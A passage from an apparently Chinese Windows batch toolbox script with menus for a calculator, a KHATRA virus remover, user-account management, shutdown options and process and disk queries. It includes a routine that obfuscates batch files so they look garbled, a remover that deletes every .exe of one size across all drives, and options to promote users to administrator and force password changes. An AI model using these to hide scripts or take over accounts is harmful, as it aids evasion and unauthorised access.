for /f "delims=" %%g in ("!jiami!") do if %%~xg==.inf set geshi=inf&set wjm=%%~ng&goto beiyongjiami(1)
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.cmd set geshi=cmd&set wjm=%%~ng&goto beiyongjiami(1)
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.ini set geshi=ini&set wjm=%%~ng&goto beiyongjiami(1)
for /f "delims=" %%g in ("!jiami!") do if %%~xg==.lrc set geshi=lrc&set wjm=%%~ng&goto beiyongjiami(1)
echo 无效的文件格式！
ping/n 2 0.0>nul
goto batjiami(1)
:beiyongjiami(1)
copy/y "!jiami!" %systemdrive%linshiwenjian.tmp
echo %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a>%systemdrive%4.tmp
echo cls>%systemdrive%5.tmp
copy/b %systemdrive%4.tmp+%systemdrive%5.tmp+%systemdrive%linshiwenjian.tmp "%zmlj%已加密的%wjm%.%geshi%"
del/f/q %systemdrive%4.tmp
del/f/q %systemdrive%5.tmp
del/f/q %systemdrive%linshiwenjian.tmp
cls
echo _______________________________________________________________________________
echo 加密完成
ping/n 2 0.0>nul
goto batjiami
:batjiami(3)
cls
title 文件加密(方法2)%system%
echo 文件加密(方法2)
echo _______________________________________________________________________________
echo 加密文件会在桌面生成(e=返回)
echo _______________________________________________________________________________
set jiami2=
set/p jiami2=拖动需要加密的文件到此窗口:
if /i "!jiami2!"=="e" goto batjiami
if "!jiami2:~0,1!!jiami2:-1!" neq """" for /f "delims=" %%a in ('"echo !jiami2!"') do (set !jiami2!="%%~a")
:jiami2pause
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.bat set geshi=bat&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.txt set geshi=txt&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.log set geshi=log&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.inf set geshi=inf&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.cmd set geshi=cmd&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.ini set geshi=ini&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.lrc set geshi=lrc&set wjm=%%~ng&goto jiami2(1)
echo 无效的文件格式！
ping/n 2 0.0>nul
goto batjiami(3)
:jiami2(1)
cls
verify on
copy/y "!jiami2!" %systemdrive%temp.0
set /p =//4NCg==<nul>%temp%\tmpcode
certutil -decode -f %temp%\tmpcode %systemdrive%temp>nul
copy/b %systemdrive%temp+%systemdrive%temp.0 "%zmlj%已加密的%wjm%.%geshi%"
del/f/q %systemdrive%temp
del/f/q %systemdrive%temp.0
cls
echo _______________________________________________________________________________
echo 加密完成
ping/n 2 0.0>nul
goto batjiami
:13
title DOS计算器%system%
cls
echo _______________________________________________________________________________
echo 注意:DOS计算只能进行整数运算，计算结果只能精确到整数
echo 有效数值范围(-2147483648至2147483647)(c=清屏 e=返回)
echo _______________________________________________________________________________
:13(1)
set biaodashi=
set/p biaodashi=请输入表达式:
set biaodashi="%biaodashi:|=%"
if /i !biaodashi!=="c" goto 13
if /i !biaodashi!=="e" goto memuv2
:13(2)
set/a jieguo=%biaodashi%
echo 计算结果:%biaodashi%=%jieguo%
echo _______________________________________________________________________________
goto 13(1)
:14
title 解除命令提示符被禁用%system%
cls
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t reg_dword /d 00000000 /f
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:15
title 随机数生成器%system%
set/a cs=0
cls
echo 说明:只能输入整数，随机数范围(0-32767)(e=返回菜单)
echo _______________________________________________________________________________
set zuidazhi=
set zuixiaozhi=
set/p zuidazhi=请输入随机数的最大值:
set/p zuixiaozhi=请输入随机数的最小值:
echo _______________________________________________________________________________
:15(1)
set/a cs+=1
set/a zdzcl=%zuidazhi%+1
set/a suijishu=%random%%%(%zdzcl%-%zuixiaozhi%)+%zuixiaozhi%
echo 第%cs%次产生的随机数:%suijishu%
:15(3)
set tuichusuijishu=
set/p tuichusuijishu=
set tuichusuijishu="%tuichusuijishu:|=%"
if /i !tuichusuijishu!=="e" goto memuv2
if /i !tuichusuijishu!=="|=" goto 15(1)
goto 15(3)
:16
title 清除KHATRA病毒%system%
cls
echo 按任意键开始清除KHATRT病毒&pause>nul
cls
echo 正在结束KHATRA病毒进程...
ping/n 2 0.0>nul
:16(4)
set khatra=0
:16(4)(1)
taskkill /f /im xplorer.exe
attrib -s -h -r "%systemdrive%\windows\xplorer.exe"
del/f/q "%systemdrive%\windows\xplorer.exe"
md "%systemdrive%\windows\xplorer.exe"
taskkill /f /im ghost.exe
attrib -s -h -r "%systemdrive%\windows\system\ghost.exe"
del/f/q "%systemdrive%\windows\system\ghost.exe"
md "%systemdrive%\windows\system\ghost.exe"
taskkill /f /im khatra.exe
attrib -s -h -r "%systemdrive%\windows\system32\khatra.exe"
del/f/q "%systemdrive%\windows\system32\khatra.exe"
md "%systemdrive%\windows\system32\khatra.exe"
attrib -s -h -r "%systemdrive%\khatra.exe"
del/f/q "%systemdrive%\khatra.exe"
md "%systemdrive%\khatra.exe"
if not %khatra%==1 set/a khatra=%khatra%+1&goto 16(4)(1)
echo _______________________________________________________________________________
echo 正在删除KHATRA病毒...
echo _______________________________________________________________________________
ping/n 2 0.0>nul
rd/s/q "%systemdrive%\khatra.exe"
rd/s/q "%systemdrive%\windows\xplorer.exe"
rd/s/q "%systemdrive%\windows\system\ghost.exe"
rd/s/q "%systemdrive%\windows\system32\khatra.exe"
rd/s/q "%systemdrive%\windows\k.backup"
rd/s/q "%systemdrive%\windows\system32\ntmsdata"
del/f/q "%systemdrive%\windows\youtube.cab"
del/f/q "%systemdrive%\windows\supermodels.cab"
del/f/q "%systemdrive%\windows\new-screamsaver.com.cab"
del/f/q "%systemdrive%\windows\New WinZip File.cab"
del/f/q "%systemdrive%\windows\New WinRAR ZIP archive.cab"
del/f/q "%systemdrive%\windows\New WinRAR archive.cab"
del/f/q "%systemdrive%\windows\mario675.cab"
del/f/q "%systemdrive%\windows\kavSetupEng3857.cab"
del/f/q "%systemdrive%\windows\fh_antivirussetup6534.cab"
del/f/q "%systemdrive%\windows\CyberWar.cab"
del/f/q "%systemdrive%\windows\khatarnakh.exe"
del/f/q "%systemdrive%\windows\tasks\at1.job"
del/f/q "%systemdrive%\windows\system32\avphost.dll"
del/f/q "%systemdrive%\windows\inf\autoplay.inf"
echo _______________________________________________________________________________
echo 正在全盘扫描...
echo _______________________________________________________________________________
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for /f "delims=" %%a in ('"for %%b in (%sypf%) do dir/a/s/b %%b*.exe"') do if %%~za==486912 attrib -s -h -r "%%a"|del/f/q "%%a"|echo 已删除%%a
for /f "delims=" %%c in ('"for %%d in (%sypf%) do dir/a/s/b %%dautorun.inf"') do if %%~zc==234 attrib -s -h -r "%%c"|del/f/q "%%c"|echo 已删除%%c
for %%k in (%sypf%) do del/f/s/q %%k(Empty).lnk
echo [Version]>%systemdrive%\windows\temp\reg.inf
echo Signature="$CHICAGO$">>%systemdrive%\windows\temp\reg.inf
echo [DefaultInstall]>>%systemdrive%\windows\temp\reg.inf
echo DelReg=del>>%systemdrive%\windows\temp\reg.inf
echo [del]>>%systemdrive%\windows\temp\reg.inf
echo HKCU,Software\Microsoft\Windows\CurrentVersion\Policies\System,Disableregistrytools>>%systemdrive%\windows\temp\reg.inf
rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 %systemdrive%\windows\temp\reg.inf
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t reg_dword /d 00000001 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000000 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer" /v nosetfolders /t reg_dword /d 00000000 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t reg_dword /d 00000000 /f
del/f/q %systemdrive%\windows\temp\reg.inf
if /i "%sypf%"=="c:\" goto shoudong
if /i "%sypf%"=="c:\ " goto shoudong
ping/n 2 0.0>nul
:16(1)
echo _______________________________________________________________________________
set zhucebiaoqingli=
set/p zhucebiaoqingli=注册表需要手动清理.是否打开注册表(y/n):
set zhucebiaoqingli="%zhucebiaoqingli:|=%"
if /i !zhucebiaoqingli!=="y" goto 16(2)
if /i !zhucebiaoqingli!=="n" goto 16(3)
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 16(1)
:16(2)
cls
regedit
:16(3)
cls
echo KHATRA病毒清除完成
echo 按任意键返回菜单&pause>nul
goto memuv2
:shoudong
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for /f "delims=" %%a in ('"for %%b in (%sypf%) do dir/a/s/b %%b*.exe"') do if %%~za==486912 attrib -s -h -r "%%a"|del/f/q "%%a"|echo 已删除%%a
for /f "delims=" %%c in ('"for %%d in (%sypf%) do dir/a/s/b %%dautorun.inf"') do if %%~zc==234 attrib -s -h -r "%%c"|del/f/q "%%c"|echo 已删除%%c
for %%k in (%sypf%) do del/f/s/q %%k:\(Empty).lnk
goto 16(1)
:17
cls
start regedit
goto memuv2
:18
cls
start control
goto memuv2
:19
cls
start dxdiag
goto memuv2
:20
cls
start compmgmt.msc
goto memuv2
:21
title 用户管理%system%
cls
echo _______________________________________________________________________________
echo [1]显示所有的用户
echo [2]创建新用户
echo [3]删除用户
echo [4]提升用户为管理员
echo [5]强制修改用户密码
echo [6]查看用户信息
echo [7]激活账户
echo [8]停用账户
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 123456780 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" goto 21(1)
if "%errorlevel%" equ "2" goto 21(2)
if "%errorlevel%" equ "3" goto 21(3)
if "%errorlevel%" equ "4" goto 21(4)
if "%errorlevel%" equ "5" goto 21(5)
if "%errorlevel%" equ "6" goto 21(6)
if "%errorlevel%" equ "7" goto 21(7)
if "%errorlevel%" equ "8" goto 21(8)
if "%errorlevel%" equ "9" goto memuv2
goto 21
set yonghu=
set/p yonghu=请输入你的选择:
set yonghu="%yonghu:|=%"
if !yonghu!=="1" goto 21(1)
if !yonghu!=="2" goto 21(2)
if !yonghu!=="3" goto 21(3)
if !yonghu!=="4" goto 21(4)
if !yonghu!=="5" goto 21(5)
if !yonghu!=="6" goto 21(6)
if !yonghu!=="7" goto 21(7)
if !yonghu!=="8" goto 21(8)
if !yonghu!=="0" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 21
:21(1)
title 显示所有的用户%system%
cls
echo _______________________________________________________________________________
net user
echo _______________________________________________________________________________
echo 当前已登录的用户:%username%
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 21
:21(2)
title 创建新用户%system%
cls
echo 注意:创建的用户类型为普通用户
echo _______________________________________________________________________________
net user
echo _______________________________________________________________________________
echo 当前已登录的用户:%username%
echo _______________________________________________________________________________
set xinyonghuming=
set xinyonghumima=
set/p xinyonghuming=用户名:
set/p xinyonghumima=密码:
echo _______________________________________________________________________________
cls
net user %xinyonghuming% %xinyonghumima% /add
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 21
:21(3)
title 删除用户%system%
cls
echo _______________________________________________________________________________
net user
echo _______________________________________________________________________________
echo 当前已登录的用户:%username%
echo _______________________________________________________________________________
set shanchuyonghu=
set/p shanchuyonghu=请输入要删除的用户:
cls
net user %shanchuyonghu% /del
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 21
:21(4)
title 提升用户为管理员%system%
cls
echo _______________________________________________________________________________
net user
echo _______________________________________________________________________________
echo 当前已登录的用户:%username%
echo _______________________________________________________________________________
set/p tishengyonghu=
set/p tishengyonghu=请输入要提升的用户名:
cls
net localgroup administrators %tishengyonghu% /add
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 21
:21(5)
title 强制修改用户密码%system%
cls
echo _______________________________________________________________________________
net user
echo _______________________________________________________________________________
echo 当前已登录的用户:%username%
echo _______________________________________________________________________________
set xiougaimima=
set xinmima=
set/p xiougaimima=请输入要修改的用户名:
set/p xinmima=请输入新密码:
cls
net user %xiougaimima% %xinmima%
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 21
:21(6)
title 查看用户信息%system%
cls
net user
echo _______________________________________________________________________________
echo 当前已登录的用户:%username%
echo _______________________________________________________________________________
set chakanyonghuxinxi=
set/p chakanyonghuxinxi=请输入要查看的用户名:
cls
net user %chakanyonghuxinxi%
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 21
:21(7)
title 激活账户%system%
cls
net user
echo _______________________________________________________________________________
echo 当前已登录的用户:%username%
echo _______________________________________________________________________________
set jhzh=
set/p jhzh=请输入要操作的用户名:
cls
net user %jhzh% /active:yes
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 21
:21(8)
title 停用账户%system%
cls
net user
echo _______________________________________________________________________________
echo 当前已登录的用户:%username%
echo _______________________________________________________________________________
set tyzh=
set/p tyzh=请输入要操作的用户名:
cls
net user %tyzh% /active:no
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 21
:22
cls
start gpedit.msc
goto memuv2
:guanji
title 关机选项%system%
color 0a
cls
echo _______________________________________________________________________________
echo [1]关机
echo [2]重启
echo [3]注销
echo [4]放弃系统关机
echo [5]开启休眠功能
echo [6]关闭休眠功能
echo [7]显示系统上可用的睡眠状态
echo [8]锁屏
echo [9]循环显示唤醒计时器与电源请求
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 1234567890 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" goto guanji(1)
if "%errorlevel%" equ "2" goto guanji(2)
if "%errorlevel%" equ "3" goto guanji(3)
if "%errorlevel%" equ "4" goto guanji(4)
if "%errorlevel%" equ "5" goto guanji(6)
if "%errorlevel%" equ "6" goto guanji(7)
if "%errorlevel%" equ "7" goto guanji(8)
::if "%errorlevel%" equ "8" tsdiscon
if "%errorlevel%" equ "8" rundll32.exe user32.dll LockWorkStation
if "%errorlevel%" equ "9" goto guanji-9
if "%errorlevel%" equ "10" if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
goto guanji
set guanjixuanxiang=
set/p guanjixuanxiang=请输入你的选择:
set guanjixuanxiang="%guanjixuanxiang:|=%"
if !guanjixuanxiang!=="1" goto guanji(1)
if !guanjixuanxiang!=="2" goto guanji(2)
if !guanjixuanxiang!=="3" goto guanji(3)
if !guanjixuanxiang!=="4" goto guanji(4)
if !guanjixuanxiang!=="5" goto guanji(6)
if !guanjixuanxiang!=="6" goto guanji(7)
if !guanjixuanxiang!=="7" goto guanji(8)
if !guanjixuanxiang!=="0" if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto guanji
:guanji(1)
title 关机%system%
cls
echo 请设置关机倒计时，有效范围(0-315360000)秒(e=返回)
set guanjidaojishi=
set/p guanjidaojishi=
if not defined guanjidaojishi set guanjidaojishi=x
set guanjidaojishi=%guanjidaojishi:|=%
if "!guanjidaojishi!"=="x" shutdown /s /f&goto guanji
if /i !guanjidaojishi!==e goto guanji
if !guanjidaojishi! leq 315360000 goto guanji(1)(1)
echo 不是有效数字！
ping/n 2 0.0>nul
goto guanji(1)
:guanji(1)(1)
if !guanjidaojishi! geq 0 shutdown /s /f /t %guanjidaojishi%&goto guanji
echo 不是有效数字！
ping/n 2 0.0>nul
goto guanji(1)
:guanji(2)
title 重启%system%
cls
echo 请设置重启倒计时，有效范围(0-315360000)秒(e=返回)
set chongqidaojishi=
set/p chongqidaojishi=
if not defined chongqidaojishi set chongqidaojishi=x
set chongqidaojishi=%chongqidaojishi:|=%
if "!chongqidaojishi!"=="x" shutdown /r /f&goto guanji 
if /i !chongqidaojishi!==e goto guanji
if !chongqidaojishi! leq 315360000 goto guanji(2)(1)
echo 不是有效数字！
ping/n 2 0.0>nul
goto guanji(2)
:guanji(2)(1)
if !chongqidaojishi! geq 0 shutdown /r /f /t %chongqidaojishi%&goto guanji
echo 不是有效数字！
ping/n 2 0.0>nul
goto guanji(2)
:guanji(3)
title 注销%system%
cls
set zhuxiao=
set/p zhuxiao=是否立即注销(y/n):
set zhuxiao="%zhuxiao:|=%"
if /i !zhuxiao!=="y" logoff&goto 00
if /i !zhuxiao!=="n" goto guanji
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto guanji(3)
:guanji(4)
title 放弃系统关机%system%
cls
shutdown /a
ping/n 2 0.0>nul
goto guanji
:guanji(6)
title 开启休眠%system%
cls
set size=
set/p size=设置休眠文件占用总内存比例(40~100)(默认100)(e=返回):
set size="%size:|=%"
if /i !size!=="e" goto guanji
if /i !size!=="|=" set size=100&goto xm
if "%size:~0,1%%size:~-1%" neq """" for /f "delims=" %%a in ('"echo %size%"') do (set %size%=%%~a)
set size=!size:"=!
if !size! geq 40 if !size! leq 100 goto xm
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto guanji(6)
:xm
powercfg /h /size %size%
echo 已开启休眠功能
ping/n 2 0.0>nul
goto guanji
:guanji(7)
title 关闭休眠%system%
cls
powercfg -h off
echo 已关闭休眠功能
ping/n 2 0.0>nul
goto guanji
:guanji(8)
title 显示系统上可用的睡眠状态%system%
cls
powercfg -a
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto guanji
:guanji-9
title 循环显示唤醒计时器与电源请求%system%
cls
powercfg /requests
powercfg /waketimers
echo _______________________________________________________________________________
echo 按e返回菜单
choice /c 1e /t 1 /d 1 >nul
if "%errorlevel%" equ ="2" goto guanji
goto guanji-9
:23
title DOS任务管理器%system%
set cho=1234560
cls
echo _______________________________________________________________________________
echo [1]显示所有进程
echo [2]显示每个进程的服务
echo [3]显示进程路径
echo [4]显示进程详细信息
echo [5]显示进程的TCP/UDP连接
echo;[6]循环显示CPU占用率与网络速度
echo [0]返回菜单
echo _______________________________________________________________________________
rem ::choice /c 1234560 /n /m 请输入你的选择:
!sel!
if "!shuru!" equ "1" goto 23(1)
if "!shuru!" equ "2" goto 23(2)
if "!shuru!" equ "3" goto 23(6)
if "!shuru!" equ "4" goto 23(10)
if "!shuru!" equ "5" goto 23.1
if "!shuru!" equ "6" goto 23-1
if "!shuru!" equ "7" goto memuv2
if "!shuru!" equ "0" goto memuv2
goto 23
set dosjc=
set/p dosjc=请输入你的选择:
set dosjc="%dosjc:|=%"
if !dosjc!=="1" goto 23(1)
if !dosjc!=="2" goto 23(2)
if !dosjc!=="3" goto 23(6)
if !dosjc!=="4" goto 23(10)
if !dosjc!=="0" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 23
:23(1)
cls
tasklist
echo _______________________________________________________________________________
echo (e=返回)(f=刷新)
set jcjs=
set/p jcjs=输入要结束的进程PID或名称:
if not defined jcjs goto 23(1)
set jcjs="%jcjs:|=%"
if /i !jcjs!=="f" goto 23(1)
if /i !jcjs!=="e" goto 23
taskkill /f /im %jcjs%
ping/n 2 0.0>nul
goto 23(1)
:23(2)
cls
tasklist/svc
echo _______________________________________________________________________________
echo (e=返回)(f=刷新)
set jcfw=
set/p jcfw=输入要结束的进程PID或名称:
if not defined jcfw goto 23(2)
set jcfw="%jcfw:|=%"
if /i !jcfw!=="f" goto 23(2)
if /i !jcfw!=="e" goto 23
taskkill /f /im %jcfw%
ping/n 2 0.0>nul
goto 23(2)
:23(6)
title 显示进程路径%system%
cls
tasklist
echo _______________________________________________________________________________
echo (e=返回)(f=刷新)
set jclj=
set/p jclj=输入要显示的进程PID:
if not defined jclj goto 23(1)
set jclj="%jclj:|=%"
if /i !jclj!=="f" goto 23(1)
if /i !jclj!=="e" goto 23
tasklist /fi "pid eq %jclj%"|findstr /i "%jclj%"||echo 没有此进程&&timeout /t 2 /nobreak>nul&&goto 23(6)
cls
for /f "delims=" %%a in ('"wmic process where processid=!jclj! get /format:value|find /i "executablepath""') do set jclj1=%%a
echo 文件路径: %jclj1:~15%
echo _______________________________________________________________________________
echo (e=返回)(f=刷新)(d=打开文件位置)
choice /c efd /n /m 请输入你的选择:
if "%errorlevel%" equ "1" goto 23(6)
if "%errorlevel%" equ "2" goto 23
if "%errorlevel%" equ "3" goto 23(8)
goto 23(7)
set jcljxs=
set/p jcljxs=请输入你的选择:
if not defined jcljxs goto 23(6)
set jcljxs="%jcljxs:|=%"
if /i !jcljxs!=="f" goto 23(6)
if /i !jcljxs!=="e" goto 23
if /i !jcljxs!=="d" goto 23(8)
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 23(7)
:23(8)
explorer/select,"%jclj1:~15%"
goto 23
:23(10)
title 显示进程详细信息%system%
cls
echo _______________________________________________________________________________
tasklist
echo _______________________________________________________________________________
echo (e=返回)(f=刷新)
set jcxq=
set/p jcxq=请输入要显示的进程的PID:
if not defined jcxq goto 23(10)
set jcxq="%jcxq:|=%"
if /i !jcxq!=="e" goto 23
if /i !jcxq!=="f" goto 23(10)
tasklist /fi "pid eq %jcxq%"|findstr /i "%jcxq%"||echo 没有此进程&&timeout /t 2 /nobreak>nul&&goto 23(10)
cls
echo _______________________________________________________________________________
set jcmz=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "caption""') do set jcmz=%%a
echo 进程名称:		!jcmz:~8!
set jcmlh=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "commandline""') do set jcmlh=%%a
echo 进程命令行:		!jcmlh:~12!
set jcrq=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "creationdate""') do set jcrq=%%a
echo 进程启动日期:		!jcrq:~13,4!年!jcrq:~17,2!月!jcrq:~19,2!日 !jcrq:~21,2!:!jcrq:~23,2!:!jcrq:~25,2!
set jclj=
set jclj1=
for /f "skip=2 tokens=2 delims==" %%a in ('"wmic process where processid=!jcxq! get executablepath /format:value"') do (
set jclj=%%a
call :zfccd "!jclj!"
set /a zfcgs-=1
for /l %%b in (0,1,!zfcgs!) do (if "!jclj:~%%b,1!" neq "" set jclj1=!jclj1!!jclj:~%%b,1!))
echo;进程路径:		"!jclj1!"
set jcpid=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "processid""') do set jcpid=%%a
echo 进程PID:		!jcpid:~10!
set jchx=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "kernelmodetime""') do set jchx=%%a
echo 进程核心模式时间:	!jchx:~15!
echo 系统名称:		!system:~3! !bit!位
set jcymcw=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "pagefaults""') do set jcymcw=%%a
echo 进程页面错误:		!jcymcw:~12!
set jcfid=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "parentprocessid""') do set jcfid=%%a
echo 进程父系PID:		!jcfid:~16!
set jcysy=
for /f "tokens=2 delims==" %%a in ('"wmic process where processid=!jcxq! get PageFileUsage /format:value"') do set jcysy=%%a
call :xdwjs !jcysy! kb dw
echo 进程页面文件使用:	!dw!
set jcxcs=
for /f "tokens=2 delims==" %%a in ('"wmic process where processid=!jcxq! get ThreadCount /format:value"') do set jcxcs=%%a
echo 进程线程数:		!jcxcs!
set jcyxj=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "priority""') do set jcyxj=%%a
echo 进程优先级:		!jcyxj:~9!
set jchhid=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "sessionid""') do set jchhid=%%a
echo 进程回话ID:		!jchhid:~10!
tasklist /fi "pid eq %jcxq%" /m
ver
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 23
:23.1
title 显示TCP/UDP连接%system%
cls
netstat -aon
echo _______________________________________________________________________________
echo (e=返回)(f=刷新)
set 字符串=
set /p 字符串=输入要查找的字符串: 
if not defined 字符串 (goto 23.1)
if "!字符串!" equ "e" (goto 23)
if "!字符串!" equ "f" (goto 23.1)
cls
netstat -aon|findstr /i /c:"!字符串!"
echo _______________________________________________________________________________
set /p =按任意键返回<nul&pause>nul
goto 23
:23-1
color 0f
set ysbak=97;40m
title 循环显示CPU占用率与网络速度%system%
cls
echo;正在获取网络信息...
for /f "tokens=2 delims==" %%a in ('"Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get name /value"') do (
    set netcard=%%a
)
for /f "tokens=2 delims==" %%a in ('"wmic cpu get numberOflogicalprocessors /value"') do (
    set corenum=%%a
    set /a tghs=corenum*2+4+2
)
for /f "tokens=2 delims==" %%a in ('"wmic cpu get name /value"') do (
    set cpu=%%a
)
cls
:23-1-1
(
set xh=
for /f "tokens=2 delims==" %%a in ('"Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get BytesReceivedPersec^,BytesSentPersec /value"') do (
    set /a "xh+=1"
    if !xh! equ 1 (
        set downspeed=%%a
    )
    if !xh! equ 2 (
        set upspeed=%%a
        for /f "skip=%tghs% tokens=2 delims==" %%a in ('"Wmic Path Win32_PerfFormattedData_PerfOS_Processor Get PercentIdleTime /value"') do (
            set /a lyl=100-%%a
        )
    )
)
call :xdwjs !upspeed! b upspeed
call :xdwjs !downspeed! b downspeed
echo;!netcard!
echo;
(echo;上传速度:  !upspeed!/s 下载速度:   !downspeed!/s   	)
echo;
echo;!cpu!
echo;
set /p =CPU总体利用率:  <nul
if !lyl! leq 25 (
    call :rgb 12.12.12 0.255.0 !lyl!
) else (
    if !lyl! leq 50 (
        call :rgb 12.12.12 255.255.0 !lyl!
    ) else (
        if !lyl! leq 75 (
            call :rgb 12.12.12 255.127.0 !lyl!
        ) else (
            call :rgb 12.12.12 255.0.0 !lyl!
        )
    )
)
set /p =%%  <nul
echo;
echo;_______________________________________________________________________________
echo;按e返回菜单
set /p =!cswz!s!cswz!0;0H<nul
choice /c 1e /t 1 /d 1 >nul
if "!errorlevel!" equ ="2" goto 23
goto 23-1-1
)
:24
title 文件系统信息查询%system%
cls
echo _______________________________________________________________________________
echo [1]列出所有驱动器
echo [2]查询一个驱动器的类型
echo [3]查询卷信息
echo [4]查询NTFS卷信息
echo [5]查询REFS卷信息
echo [6]查询扇区信息
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 1234560 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" goto 24(1)
if "%errorlevel%" equ "2" goto 24(2)
if "%errorlevel%" equ "3" goto 24(3)
if "%errorlevel%" equ "4" goto 24(4)
if "%errorlevel%" equ "5" goto 24(5)
if "%errorlevel%" equ "6" goto 24(6)
if "%errorlevel%" equ "7" goto memuv2
goto 24
set wjsystem=
set/p wjsystem=请输入你的选择:
set wjsystem="%wjsystem:|=%"
if !wjsystem!=="1" goto 24(1)
if !wjsystem!=="2" goto 24(2)
if !wjsystem!=="3" goto 24(3)
if !wjsystem!=="4" goto 24(4)
if !wjsystem!=="5" goto 24(5)
if !wjsystem!=="6" goto 24(6)
if !wjsystem!=="0" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 24
:24(1)
titel 列出所有驱动器
cls
fsutil fsinfo drives
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 24
:24(2)
title 查询一个驱动器的类型%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set qdqlx=
set/p qdqlx=请输入要查询的驱动器:
cls
fsutil fsinfo drivetype %qdqlx%:
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 24
:24(3)
title 查询卷信息%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set juanxx=
set/p juanxx=请输入要查询的驱动器:
cls
fsutil fsinfo volumeinfo %juanxx%:
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 24
:24(4)
title 查询NTFS卷信息%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set ntfsjxx=
set/p ntfsjxx=请输入要查询的驱动器:
cls
